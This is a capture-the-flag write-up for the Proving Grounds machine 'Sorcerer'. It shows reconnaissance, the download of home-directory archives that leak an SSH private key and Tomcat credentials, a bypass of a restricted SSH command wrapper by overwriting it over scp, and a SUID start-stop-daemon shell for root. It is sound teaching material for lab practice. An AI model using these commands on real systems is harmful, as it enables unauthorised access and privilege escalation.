---
title: Socerer
parent: Proving Grounds Play
grand_parent: Writeups
nav_order: 1
---
# Sorcerer
## Linux
## Intermediate

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ nmap -Pn -p- -sCV -A -oN full_scan.txt -open 192.168.201.100 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-09 17:35 +0900
Nmap scan report for 192.168.201.100
Host is up (0.099s latency).
Not shown: 65085 closed tcp ports (reset), 440 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      42329/tcp   mountd
|   100005  1,2,3      59704/udp   mountd
|   100021  1,3,4      33065/tcp   nlockmgr
|   100021  1,3,4      51595/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.4
33065/tcp open  nlockmgr 1-4 (RPC #100021)
35835/tcp open  mountd   1-3 (RPC #100005)
42329/tcp open  mountd   1-3 (RPC #100005)
43307/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   98.55 ms 192.168.45.1
2   97.39 ms 192.168.45.254
3   97.14 ms 192.168.251.1
4   98.60 ms 192.168.201.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.69 seconds
```

# HTTP

## 80

![](../../../assets/images/Pasted%20image%2020260509182245.png)

## 7742

![](../../../assets/images/Pasted%20image%2020260509183042.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ gobuster dir -u http://192.168.201.100:7742 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,aspx -k -t 42 -b 400,401,504,404 --no-error
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.201.100:7742
[+] Method:                  GET
[+] Threads:                 42
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   400,401,504,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,zip,asp,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 1219]
default              (Status: 301) [Size: 178] [--> http://192.168.201.100:7742/default/]
zipfiles             (Status: 301) [Size: 178] [--> http://192.168.201.100:7742/zipfiles/]
Progress: 1543906 / 1543906 (100.00%)
===============================================================
Finished
===============================================================
```
- defualt
- zipfiles

http://192.168.201.100:7742/zipfiles/
![](../../../assets/images/Pasted%20image%2020260509220855.png)

### Download & Extract

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ unzip francis.zip 
Archive:  francis.zip
   creating: home/francis/
  inflating: home/francis/.bash_logout  
  inflating: home/francis/.profile   
  inflating: home/francis/.bashrc    
```

```
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ unzip max.zip    
Archive:  max.zip
   creating: home/max/
  inflating: home/max/.bash_logout   
  inflating: home/max/.profile       
   creating: home/max/.ssh/
  inflating: home/max/.ssh/id_rsa.pub  
  inflating: home/max/.ssh/authorized_keys  
  inflating: home/max/.ssh/id_rsa    
  inflating: home/max/tomcat-users.xml.bak  
  inflating: home/max/.bashrc        
  inflating: home/max/scp_wrapper.sh  
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ cat home/max/.ssh/authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer   
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ unzip miriam.zip 
Archive:  miriam.zip
   creating: home/miriam/
  inflating: home/miriam/.bash_logout  
  inflating: home/miriam/.profile    
  inflating: home/miriam/.bashrc     
                                                                                                   
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ unzip sofia.zip 
Archive:  sofia.zip
   creating: home/sofia/
  inflating: home/sofia/.bash_logout  
  inflating: home/sofia/.profile     
  inflating: home/sofia/.bashrc  
```
*max has many files.*

```zsh
┌──(kali㉿kali)-[~/…/OffSec/sorcerer/home/max]
└─$ cat tomcat-users.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->

  <role rolename="manager-gui"/>
  <user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
</tomcat-users>          
```
## 8080

![](../../../assets/images/Pasted%20image%2020260509183109.png)
- Apache Tomcat/7.0.4

# NFS

```zsh
showmount -e 192.168.201.100  
Export list for 192.168.201.100:
```

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ cat home/max/.ssh/authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ cat home/max/scp_wrapper.sh              
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ cp home/max/scp_wrapper.sh my_scp_wrapper.sh
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ vi my_scp_wrapper.sh
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ cat my_scp_wrapper.sh      
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'bash'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "Good."
    bash
    ;;
esac
```

```zsh
──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ scp -O -i home/max/.ssh/id_rsa my_scp_wrapper.sh max@192.168.201.100:/home/max/scp_wrapper
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
my_scp_wrapper.sh                                                100%  127     1.5KB/s   00:00
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ cp home/max/.ssh/id_rsa ~/.ssh
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/sorcerer]
└─$ ssh max@192.168.201.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
PTY allocation request failed on channel 0
Good.
id
uid=1003(max) gid=1003(max) groups=1003(max)
```

## user flag
```bash
max@sorcerer:~$ ls /home/dennis
ls /home/dennis
local.txt
max@sorcerer:~$ cat /home/dennis/local.txt
cat /home/dennis/local.txt
```
---
# Privilege Escalation
## Upgrade the shell:

```zsh
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
max@sorcerer:~$ 
```

```zsh
max@sorcerer:~$ hostname
hostname
sorcerer
max@sorcerer:~$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

```zsh
max@sorcerer:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/mount.nfs
/usr/sbin/start-stop-daemon
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/su
/usr/bin/mount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
/usr/sbin/start-stop-daemon

![](../../../assets/images/Pasted%20image%2020260510011452.png)
*This did not work as expected. I referenced an older GTFOBins entry in the writeup and executed the following command.*


```bash
max@sorcerer:~$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

```
# id
id
uid=1003(max) gid=1003(max) euid=0(root) groups=1003(max)
```

```
# cat /root/proof.txt
cat /root/proof.txt

# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:3e:1d brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.100/24 brd 192.168.201.255 scope global ens192
       valid_lft forever preferred_lft forever
```

# After test
## Dirty Flag
```bash
max@sorcerer:~$ chmod +x exp
chmod +x exp
max@sorcerer:~$ ./exp
./exp
./exp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./exp)
./exp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by ./exp)
./exp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exp)
max@sorcerer:~$ uname -ar
uname -ar
Linux sorcerer 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
```